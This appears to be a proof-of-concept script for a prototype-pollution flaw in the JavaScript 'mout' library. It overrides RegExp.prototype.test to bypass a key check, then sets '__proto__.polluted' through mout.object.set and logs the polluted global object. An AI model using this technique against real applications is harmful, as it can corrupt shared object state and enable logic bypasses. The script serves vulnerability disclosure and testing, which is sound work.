RegExp.prototype.test = () => true;
var mout = require('mout');
var obj = {};
console.log({}.polluted);
mout.object.set(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);